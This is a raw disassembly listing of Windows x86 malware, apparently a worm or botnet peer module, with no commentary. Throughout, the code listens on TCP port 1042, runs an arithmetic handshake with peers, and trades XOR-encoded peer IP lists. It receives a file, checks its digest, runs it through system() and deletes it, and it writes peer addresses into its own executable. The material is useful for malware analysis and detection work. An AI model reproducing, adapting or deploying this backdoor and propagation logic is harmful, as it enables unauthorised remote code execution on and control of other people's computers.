		lea	eax, [ebp-278h]
		push	edi
		push	eax
		push	dword ptr [ebx+4]
		call	esi
		push	dword ptr [ebp+70h]
		test	eax, eax
		jg	short loc_807693
		call	ds:fclose
		xor	esi, esi
		push	40h
		lea	eax, [ebp+20h]
		push	esi
		push	eax
		call	memset
		push	offset dword_8026E8
		lea	eax, [ebp-20h]
		push	offset dword_802728
		push	eax
		lea	eax, [ebp+20h]
		push	eax
		call	sub_807101
		add	esp, 20h
		cmp	dword ptr [ebp+48h], 30303030h
		lea	eax, [ebp-120h]
		jnz	loc_8077C9
		push	offset dword_802770
		push	eax
		call	ds:fopen
		pop	ecx
		mov	ebx, eax
		pop	ecx
		push	dword ptr [ebp+4Ch] ; netlong
		call	ds:ntohl
		mov	[ebp+4Ch], eax
		lea	eax, [ebp-178h]
		push	eax
		call	sub_806CD1
		mov	eax, [ebp+4Ch]
		pop	ecx
		test	eax, eax
		jle	short loc_80776D

loc_80772D:				; CODE XREF: sub_8075B2+1B9j
		sub	eax, esi
		cmp	eax, edi
		jbe	short loc_807735
		mov	eax, edi

loc_807735:				; CODE XREF: sub_8075B2+17Fj
		push	ebx
		push	eax
		lea	eax, [ebp-278h]
		push	1
		push	eax
		call	ds:fread
		add	esp, 10h
		test	eax, eax
		jle	short loc_80776D
		add	esi, eax
		push	eax
		lea	eax, [ebp-278h]
		push	eax
		lea	eax, [ebp-178h]
		push	eax
		call	sub_806E83
		mov	eax, [ebp+4Ch]
		add	esp, 0Ch
		cmp	esi, eax
		jl	short loc_80772D

loc_80776D:				; CODE XREF: sub_8075B2+179j
					; sub_8075B2+199j
		lea	eax, [ebp-178h]
		push	eax
		lea	eax, [ebp+60h]
		push	eax
		call	sub_806F2B
		push	ebx
		call	ds:fclose
		lea	eax, [ebp+50h]
		push	10h
		push	eax
		lea	eax, [ebp+60h]
		push	eax
		call	memcmp
		add	esp, 18h
		test	eax, eax
		lea	eax, [ebp-120h]
		push	eax
		jnz	short loc_8077CA
		lea	eax, [ebp-278h]
		push	offset aS_1	; LPCSTR
		push	eax		; LPSTR
		call	ds:wsprintfA
		lea	eax, [ebp-278h]
		push	eax		; char *
		call	ds:system
		add	esp, 10h
		lea	eax, [ebp-120h]

loc_8077C9:				; CODE XREF: sub_8075B2+145j
		push	eax		; lpFileName

loc_8077CA:				; CODE XREF: sub_8075B2+1EDj
		call	ds:DeleteFileA

loc_8077D0:				; CODE XREF: sub_8075B2+3Cj
					; sub_8075B2+D9j
		pop	edi
		pop	esi
		pop	ebx
		add	ebp, 74h
		leave
		retn
sub_8075B2	endp


;  S U B	R O U T	I N E 


sub_8077D8	proc near		; CODE XREF: sub_80783E+58p

arg_0		= word ptr  4

		movzx	ecx, [esp+arg_0]
		mov	eax, ecx
		push	esi
		imul	eax, ecx
		mov	esi, 0FBFBh
		push	edi
		xor	edx, edx
		mov	edi, esi
		div	edi
		pop	edi
		mov	eax, edx
		xor	edx, edx
		imul	eax, ecx
		div	esi
		pop	esi
		mov	ax, dx
		retn
sub_8077D8	endp


;  S U B	R O U T	I N E 


sub_8077FE	proc near		; CODE XREF: sub_807983+62p

arg_0		= word ptr  4

		movzx	ecx, [esp+arg_0]
		push	ebx
		push	esi
		xor	esi, esi
		mov	ebx, 0A6ABh
		inc	esi

loc_80780D:				; CODE XREF: sub_8077FE+38j
		test	bl, 1
		jz	short loc_807822
		mov	eax, esi
		xor	edx, edx
		imul	eax, ecx
		mov	esi, 0FBFBh
		div	esi
		mov	esi, edx

loc_807822:				; CODE XREF: sub_8077FE+12j
		mov	eax, ecx
		xor	edx, edx
		imul	eax, ecx
		mov	ecx, 0FBFBh
		div	ecx
		shr	ebx, 1
		test	ebx, ebx
		mov	ecx, edx
		jnz	short loc_80780D
		mov	ax, si
		pop	esi
		pop	ebx
		retn
sub_8077FE	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80783E	proc near		; DATA XREF: sub_807D81+124o

var_2C		= dword	ptr -2Ch
s		= dword	ptr -28h
var_20		= dword	ptr -20h
buf		= byte ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
netshort	= word ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		push	ebx
		xor	ebx, ebx
		cmp	[ebp+arg_0], ebx
		push	esi
		push	edi
		jz	loc_80797B
		mov	esi, [ebp+arg_0]
		push	7
		pop	ecx
		lea	edi, [ebp+var_2C]
		push	[ebp+arg_0]	; void *
		rep movsd
		call	ds:free
		mov	esi, ds:time
		push	ebx		; time_t *
		call	esi ; time
		mov	edi, eax
		push	ebx		; time_t *
		add	edi, 3
		call	esi ; time
		imul	edi, eax
		sar	edi, 1
		add	edi, 3137h
		mov	ecx, 0A17Dh
		movzx	eax, di
		cdq
		idiv	ecx
		mov	esi, edx
		add	esi, 89h
		push	esi
		call	sub_8077D8
		add	esp, 10h
		mov	[ebp+arg_0], eax
		push	eax		; hostshort
		call	ds:htons
		mov	edi, ds:send
		mov	dword ptr [ebp+netshort], eax
		push	ebx		; flags
		lea	eax, [ebp+netshort]
		push	2		; len
		push	eax		; buf
		push	[ebp+s]		; s
		call	edi ; send
		push	ebx		; flags
		lea	eax, [ebp+netshort]
		push	2		; len
		push	eax		; buf
		push	[ebp+s]		; s
		mov	dword ptr [ebp+netshort], ebx
		call	ds:recv
		push	dword ptr [ebp+netshort] ; netshort
		call	ds:ntohs
		cmp	ax, si
		mov	dword ptr [ebp+netshort], eax
		jz	short loc_8078F7
		cmp	ax, 0FBFBh
		jb	loc_807972
		lea	eax, [ebp+var_2C]
		push	eax
		call	sub_8075B2
		pop	ecx
		jmp	short loc_807972
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8078F7:				; CODE XREF: sub_80783E+A1j
		push	[ebp+var_20]
		push	[ebp+var_2C]
		call	sub_807545
		mov	ebx, [ebp+arg_0]
		and	[ebp+var_C], 0
		pop	ecx
		pop	ecx
		mov	ecx, dword ptr [ebp+netshort]
		shr	ecx, 1
		shr	ebx, 1
		and	[ebp+var_8], 0
		mov	byte ptr [ebp+arg_0+3],	cl

loc_807919:				; CODE XREF: sub_80783E+130j
		cmp	[ebp+var_C], 0
		jz	short loc_80792A
		mov	edx, [ebp+var_2C]
		mov	eax, [ebp+var_8]
		cmp	eax, [edx+1Ch]
		jge	short loc_807970

loc_80792A:				; CODE XREF: sub_80783E+DFj
		mov	eax, [ebp+var_C]
		push	10h
		cdq
		pop	esi
		idiv	esi
		test	edx, edx
		jnz	short loc_80793B
		xor	eax, eax
		jmp	short loc_80794A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80793B:				; CODE XREF: sub_80783E+F7j
		mov	eax, [ebp+var_2C]
		mov	edx, [ebp+var_8]
		inc	[ebp+var_8]
		mov	eax, [eax+18h]
		mov	eax, [eax+edx*4]

loc_80794A:				; CODE XREF: sub_80783E+FBj
		mov	dword ptr [ebp+buf], eax
		xor	eax, eax

loc_80794F:				; CODE XREF: sub_80783E+11Bj
		xor	[ebp+eax+buf], bl
		add	bl, cl
		inc	eax
		cmp	eax, 4
		jl	short loc_80794F
		push	0		; flags
		lea	eax, [ebp+buf]
		push	4		; len
		push	eax		; buf
		push	[ebp+s]		; s
		call	edi ; send
		inc	[ebp+var_C]
		mov	cl, byte ptr [ebp+arg_0+3]
		jmp	short loc_807919
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807970:				; CODE XREF: sub_80783E+EAj
		xor	ebx, ebx

loc_807972:				; CODE XREF: sub_80783E+A7j
					; sub_80783E+B7j
		push	[ebp+s]		; s
		call	ds:closesocket

loc_80797B:				; CODE XREF: sub_80783E+Ej
		push	ebx		; dwExitCode
		call	ds:ExitThread
		int	3		; Trap to Debugger
sub_80783E	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_807983	proc near		; CODE XREF: sub_807A7B+52p

s		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
netshort	= word ptr -0Ch
buf		= byte ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8
name		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		push	ebx
		push	esi
		xor	esi, esi
		push	edi
		inc	esi
		push	6		; protocol
		push	esi		; type
		push	2
		pop	edi
		push	edi		; af
		call	ds:socket
		mov	ebx, eax
		cmp	ebx, 0FFFFFFFFh
		mov	[ebp+s], ebx
		jnz	short loc_8079AD
		xor	eax, eax
		jmp	loc_807A76
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8079AD:				; CODE XREF: sub_807983+21j
		push	10h		; namelen
		push	[ebp+name]	; name
		push	ebx		; s
		call	ds:connect
		test	eax, eax
		jnz	loc_807A6B
		push	eax		; flags
		lea	eax, [ebp+netshort]
		push	edi		; len
		push	eax		; buf
		push	ebx		; s
		call	ds:recv
		cmp	eax, edi
		jnz	loc_807A6B
		push	dword ptr [ebp+netshort] ; netshort
		mov	esi, ds:ntohs
		call	esi ; ntohs
		push	eax
		mov	dword ptr [ebp+netshort], eax
		call	sub_8077FE
		pop	ecx
		push	eax		; hostshort
		call	ds:htons
		mov	dword ptr [ebp+buf], eax
		push	0		; flags
		lea	eax, [ebp+buf]
		push	edi		; len
		push	eax		; buf
		push	ebx		; s
		call	ds:send
		push	dword ptr [ebp+buf] ; netshort
		call	esi ; ntohs
		mov	ebx, dword ptr [ebp+netshort]
		mov	dword ptr [ebp+buf], eax
		shr	eax, 1
		shr	ebx, 1
		and	[ebp+var_10], 0
		mov	[ebp+var_1], al

loc_807A19:				; CODE XREF: sub_807983+E4j
		xor	edi, edi

loc_807A1B:				; CODE XREF: sub_807983+B7j
		lea	esi, [ebp+edi+var_14]
		push	0		; flags
		push	1		; len
		push	esi		; buf
		push	[ebp+s]		; s
		call	ds:recv
		test	eax, eax
		jle	short loc_807A3C
		xor	[esi], bl
		add	bl, [ebp+var_1]
		inc	edi
		cmp	edi, 4
		jl	short loc_807A1B

loc_807A3C:				; CODE XREF: sub_807983+ACj
		cmp	edi, 4
		jl	short loc_807A69
		mov	eax, [ebp+var_10]
		push	10h
		cdq
		pop	ecx
		idiv	ecx
		test	edx, edx
		jnz	short loc_807A57
		cmp	[ebp+var_14], edx
		jnz	short loc_807A69
		test	edx, edx
		jz	short loc_807A64

loc_807A57:				; CODE XREF: sub_807983+C9j
		push	[ebp+var_14]
		push	[ebp+arg_0]
		call	sub_807545
		pop	ecx
		pop	ecx

loc_807A64:				; CODE XREF: sub_807983+D2j
		inc	[ebp+var_10]
		jmp	short loc_807A19
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807A69:				; CODE XREF: sub_807983+BCj
					; sub_807983+CEj
		xor	esi, esi

loc_807A6B:				; CODE XREF: sub_807983+38j
					; sub_807983+4Dj
		push	[ebp+s]		; s
		call	ds:closesocket
		mov	eax, esi

loc_807A76:				; CODE XREF: sub_807983+25j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_807983	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_807A7B	proc near		; CODE XREF: sub_807B09+4Bp

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		mov	esi, [ebp+arg_0]
		cmp	dword ptr [esi+1Ch], 0
		jz	short loc_807B06
		call	sub_8073E8
		cmp	dword ptr [esi+1Ch], 0
		jnz	short loc_807A9C
		and	dword ptr [esi+14h], 0
		jmp	short loc_807B06
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807A9C:				; CODE XREF: sub_807A7B+19j
		call	sub_802EB8
		xor	edx, edx
		mov	word ptr [ebp+var_10], 2
		div	dword ptr [esi+1Ch]
		mov	eax, [esi+18h]
		push	412h		; hostshort
		mov	eax, [eax+edx*4]
		mov	[ebp+var_C], eax
		call	ds:htons
		and	dword ptr [esi+14h], 0
		mov	word ptr [ebp+var_10+2], ax
		lea	eax, [ebp+var_10]
		push	eax
		push	esi
		call	sub_807983
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_807B06
		cmp	dword ptr [esi+1Ch], 100h
		jle	short loc_807B06
		call	sub_802EB8
		push	64h
		xor	edx, edx
		pop	ecx
		div	ecx
		cmp	edx, 50h
		jnb	short loc_807B06
		call	sub_803108
		test	eax, eax
		jz	short loc_807B06
		push	[ebp+var_C]
		push	esi
		call	sub_80755F
		pop	ecx
		pop	ecx

loc_807B06:				; CODE XREF: sub_807A7B+Ej
					; sub_807A7B+1Fj ...
		pop	esi
		leave
		retn
sub_807A7B	endp


;  S U B	R O U T	I N E 


sub_807B09	proc near		; CODE XREF: sub_807B7A+Bp

arg_0		= dword	ptr  8

		push	ebx
		mov	ebx, ds:Sleep
		push	ebp
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_0]
		xor	ebp, ebp

loc_807B19:				; CODE XREF: sub_807B09+20j
					; sub_807B09+66j ...
		call	sub_803108
		test	eax, eax
		jnz	short loc_807B2B
		push	3A98h		; dwMilliseconds
		call	ebx ; Sleep
		jmp	short loc_807B19
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807B2B:				; CODE XREF: sub_807B09+17j
		mov	eax, [edi+1Ch]
		cmp	eax, 200h
		jle	short loc_807B3A
		push	28h

loc_807B37:				; CODE XREF: sub_807B09+3Aj
		pop	eax
		jmp	short loc_807B51
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807B3A:				; CODE XREF: sub_807B09+2Aj
		cmp	eax, 80h
		jle	short loc_807B45
		push	14h
		jmp	short loc_807B37
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807B45:				; CODE XREF: sub_807B09+36j
		cmp	eax, 14h
		jle	short loc_807B4D
		push	14h
		pop	eax

loc_807B4D:				; CODE XREF: sub_807B09+3Fj
		test	eax, eax
		jle	short loc_807B5D

loc_807B51:				; CODE XREF: sub_807B09+2Fj
		mov	esi, eax

loc_807B53:				; CODE XREF: sub_807B09+52j
		push	edi
		call	sub_807A7B
		dec	esi
		pop	ecx
		jnz	short loc_807B53

loc_807B5D:				; CODE XREF: sub_807B09+46j
		push	1388h		; dwMilliseconds
		call	ebx ; Sleep
		mov	eax, ebp
		push	0Ah
		cdq
		pop	ecx
		idiv	ecx
		inc	ebp
		test	edx, edx
		jnz	short loc_807B19
		push	edi
		call	sub_8074A2
		pop	ecx
		jmp	short loc_807B19
sub_807B09	endp


;  S U B	R O U T	I N E 


; DWORD	__stdcall sub_807B7A(LPVOID)
sub_807B7A	proc near		; DATA XREF: sub_807D81+CCo

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jz	short loc_807B8B
		push	[esp+arg_0]
		call	sub_807B09
		pop	ecx

loc_807B8B:				; CODE XREF: sub_807B7A+5j
		push	0		; dwExitCode
		call	ds:ExitThread
		int	3		; Trap to Debugger
sub_807B7A	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_807B94	proc near		; CODE XREF: sub_8059EB+27p

name		= byte ptr -144h
var_44		= dword	ptr -44h
Buffer		= dword	ptr -4
NumberOfBytesWritten= dword ptr	 8
hFile		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 144h
		push	ebx
		push	esi
		mov	esi, [ebp+NumberOfBytesWritten]
		xor	ebx, ebx
		cmp	esi, ebx
		jnz	short loc_807BB6
		mov	esi, ds:dword_808244
		cmp	esi, ebx
		jz	loc_807C73

loc_807BB6:				; CODE XREF: sub_807B94+12j
		push	[ebp+hFile]
		call	sub_80317F
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+NumberOfBytesWritten], eax
		jz	loc_807C73
		push	edi
		push	ebx		; dwMoveMethod
		push	ebx		; lpDistanceToMoveHigh
		push	eax		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	ds:SetFilePointer
		call	sub_8073E8
		xor	edi, edi
		cmp	[esi+1Ch], ebx
		jle	short loc_807C06

loc_807BE3:				; CODE XREF: sub_807B94+70j
		mov	eax, [esi+18h]
		push	ebx		; lpOverlapped
		mov	eax, [eax+edi*4]
		mov	[ebp+Buffer], eax
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+Buffer]
		push	4		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:WriteFile
		inc	edi
		cmp	edi, [esi+1Ch]
		jl	short loc_807BE3

loc_807C06:				; CODE XREF: sub_807B94+4Dj
		lea	eax, [ebp+name]
		push	100h		; namelen
		push	eax		; name
		mov	[esi+14h], ebx
		call	ds:gethostname
		lea	eax, [ebp+name]
		push	eax		; name
		call	ds:gethostbyname
		cmp	eax, ebx
		jz	short loc_807C69
		xor	ecx, ecx

loc_807C2E:				; CODE XREF: sub_807B94+AEj
		mov	edx, [eax+0Ch]
		mov	edx, [edx+ecx*4]
		cmp	edx, ebx
		jz	short loc_807C44
		mov	edx, [edx]
		mov	[ebp+ecx*4+var_44], edx
		inc	ecx
		cmp	ecx, 10h
		jl	short loc_807C2E

loc_807C44:				; CODE XREF: sub_807B94+A2j
		cmp	ecx, ebx
		jle	short loc_807C69
		lea	esi, [ebp+ecx*4+var_44]
		mov	edi, ecx

loc_807C4E:				; CODE XREF: sub_807B94+D3j
		sub	esi, 4
		cmp	[esi], ebx
		jz	short loc_807C66
		lea	eax, [ebp+NumberOfBytesWritten]
		push	ebx		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	4		; nNumberOfBytesToWrite
		push	esi		; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:WriteFile

loc_807C66:				; CODE XREF: sub_807B94+BFj
		dec	edi
		jnz	short loc_807C4E

loc_807C69:				; CODE XREF: sub_807B94+96j
					; sub_807B94+B2j
		push	[ebp+hFile]	; hFile
		call	ds:SetEndOfFile
		pop	edi

loc_807C73:				; CODE XREF: sub_807B94+1Cj
					; sub_807B94+30j
		pop	esi
		pop	ebx
		leave
		retn
sub_807B94	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_807C77	proc near		; CODE XREF: sub_807D81+2Ep

FileName	= byte ptr -108h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		push	ebx
		push	esi
		lea	eax, [ebp+FileName]
		push	100h		; nSize
		xor	esi, esi
		push	eax		; lpFilename
		push	esi		; hModule
		call	ds:GetModuleFileNameA
		push	esi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	3		; dwShareMode
		lea	eax, [ebp+FileName]
		push	80000000h	; dwDesiredAccess
		push	eax		; lpFileName
		call	ds:CreateFileA
		mov	ebx, eax
		cmp	ebx, 0FFFFFFFFh
		jz	short loc_807D15
		push	ebx
		call	sub_80317F
		cmp	eax, esi
		pop	ecx
		jnz	short loc_807CCF
		push	ebx		; hObject
		call	ds:CloseHandle
		jmp	short loc_807D15
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807CCF:				; CODE XREF: sub_807C77+4Dj
		push	edi
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	eax		; lDistanceToMove
		push	ebx		; hFile
		call	ds:SetFilePointer
		mov	edi, ds:ReadFile
		jmp	short loc_807CF4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807CE2:				; CODE XREF: sub_807C77+94j
		cmp	[ebp+var_8], esi
		jz	short loc_807D0D
		push	[ebp+var_8]
		push	[ebp+arg_0]
		call	sub_807545
		pop	ecx
		pop	ecx

loc_807CF4:				; CODE XREF: sub_807C77+69j
		lea	eax, [ebp+var_4]
		push	esi
		push	eax
		lea	eax, [ebp+var_8]
		push	4
		push	eax
		push	ebx
		mov	[ebp+var_8], esi
		mov	[ebp+var_4], esi
		call	edi
		cmp	[ebp+var_4], esi
		jnz	short loc_807CE2

loc_807D0D:				; CODE XREF: sub_807C77+6Ej
		push	ebx		; hObject
		call	ds:CloseHandle
		pop	edi

loc_807D15:				; CODE XREF: sub_807C77+42j
					; sub_807C77+56j
		pop	esi
		pop	ebx
		leave
		retn
sub_807C77	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_807D19	proc near		; CODE XREF: sub_807D81+28p

name		= byte ptr -140h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 140h
		lea	eax, [ebp+name]
		push	100h		; namelen
		push	eax		; name
		call	ds:gethostname
		lea	eax, [ebp+name]
		push	eax		; name
		call	ds:gethostbyname
		test	eax, eax
		jz	short locret_807D7F
		mov	eax, [eax+0Ch]
		push	esi
		lea	ecx, [ebp+var_40]
		xor	esi, esi
		sub	ecx, eax

loc_807D50:				; CODE XREF: sub_807D19+49j
		mov	edx, [eax]
		test	edx, edx
		jz	short loc_807D7A
		mov	edx, [edx]
		inc	esi
		mov	[ecx+eax], edx
		add	eax, 4
		cmp	esi, 10h
		jl	short loc_807D50
		jmp	short loc_807D7A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807D66:				; CODE XREF: sub_807D19+63j
		mov	eax, [ebp+esi*4+var_44]
		dec	esi
		test	eax, eax
		jz	short loc_807D7A
		push	eax
		push	[ebp+arg_0]
		call	sub_807545
		pop	ecx
		pop	ecx

loc_807D7A:				; CODE XREF: sub_807D19+3Bj
					; sub_807D19+4Bj ...
		test	esi, esi
		jg	short loc_807D66
		pop	esi

locret_807D7F:				; CODE XREF: sub_807D19+2Aj
		leave
		retn
sub_807D19	endp


;  S U B	R O U T	I N E 


sub_807D81	proc near		; CODE XREF: StartAddressp

ThreadId	= dword	ptr -4

		push	ecx
		push	ebx
		push	ebp
		push	esi
		push	edi
		push	2Ch		; size_t
		call	ds:malloc
		mov	esi, eax
		push	2Ch
		push	0
		push	esi
		mov	ds:dword_808244, esi
		call	memset
		call	sub_8071E7
		push	esi
		mov	[esi+24h], eax
		call	sub_807D19
		push	esi
		call	sub_807C77
		push	esi
		call	sub_807400
		push	esi
		call	sub_8074A2
		mov	edi, ds:htons
		and	dword ptr [esi+4], 0
		add	esp, 20h
		mov	word ptr [esi],	2
		push	412h		; hostshort
		call	edi ; htons
		mov	ebx, ds:socket
		push	6		; protocol
		push	1		; type
		push	2		; af
		mov	[esi+2], ax
		call	ebx ; socket
		mov	ebp, ds:bind
		jmp	short loc_807E23
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807DF3:				; CODE XREF: sub_807D81+ADj
		push	dword ptr [esi+10h] ; s
		call	ds:closesocket
		push	3E8h		; dwMilliseconds
		call	ds:Sleep
		mov	word ptr [esi],	2
		and	dword ptr [esi+4], 0
		push	412h		; hostshort
		call	edi ; htons
		push	6		; protocol
		push	1		; type
		push	2		; af
		mov	[esi+2], ax
		call	ebx ; socket

loc_807E23:				; CODE XREF: sub_807D81+70j
		push	10h
		push	esi
		push	eax
		mov	[esi+10h], eax
		call	ebp
		test	eax, eax
		jnz	short loc_807DF3
		push	7FFFFFFFh	; backlog
		push	dword ptr [esi+10h] ; s
		call	ds:listen
		mov	ebp, ds:CreateThread
		lea	eax, [esp+14h+ThreadId]
		xor	ebx, ebx
		push	eax		; lpThreadId
		push	ebx		; dwCreationFlags
		push	esi		; lpParameter
		push	offset sub_807B7A ; lpStartAddress

loc_807E52:				; CODE XREF: sub_807D81+129j
		push	ebx		; dwStackSize
		push	ebx		; lpThreadAttributes
		call	ebp ; CreateThread

loc_807E56:				; CODE XREF: sub_807D81+11Bj
		push	1Ch		; size_t
		call	ds:malloc
		mov	edi, eax
		push	1Ch
		push	ebx
		push	edi
		call	memset
		add	esp, 10h
		lea	eax, [edi+18h]
		mov	[edi], esi
		mov	dword ptr [eax], 10h
		push	eax		; addrlen
		lea	eax, [edi+8]
		push	eax		; addr
		push	dword ptr [esi+10h] ; s
		call	ds:accept
		cmp	eax, ebx
		mov	[edi+4], eax
		jg	short loc_807E9E
		push	32h		; dwMilliseconds
		call	ds:Sleep
		push	edi		; void *
		call	ds:free
		pop	ecx
		jmp	short loc_807E56
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807E9E:				; CODE XREF: sub_807D81+109j
		lea	eax, [esp+14h+ThreadId]
		push	eax
		push	ebx
		push	edi
		push	offset sub_80783E
		jmp	short loc_807E52
sub_807D81	endp


;  S U B	R O U T	I N E 


; DWORD	__stdcall StartAddress(LPVOID)
StartAddress	proc near		; DATA XREF: sub_802CB2+4Eo
		call	sub_807D81
		push	0		; dwExitCode
		call	ds:ExitThread
		int	3		; Trap to Debugger
StartAddress	endp

; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memcpy. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION strlen. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION strcpy. PRESS KEYPAD "+" TO EXPAND]
		align 10h

;  S U B	R O U T	I N E 


sub_807EE0	proc near		; CODE XREF: sub_8048A0+8p

arg_0		= dword	ptr  8

		push	ecx
		cmp	eax, 1000h
		lea	ecx, [esp+arg_0]
		jb	short loc_807F00

loc_807EEC:				; CODE XREF: sub_807EE0+1Ej
		sub	ecx, 1000h
		sub	eax, 1000h
		test	[ecx], eax
		cmp	eax, 1000h
		jnb	short loc_807EEC

loc_807F00:				; CODE XREF: sub_807EE0+Aj
		sub	ecx, eax
		mov	eax, esp
		test	[ecx], eax
		mov	esp, ecx
		mov	ecx, [eax]
		mov	eax, [eax+4]
		push	eax
		retn
sub_807EE0	endp ; sp = -8

; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION strcat. PRESS KEYPAD "+" TO EXPAND]
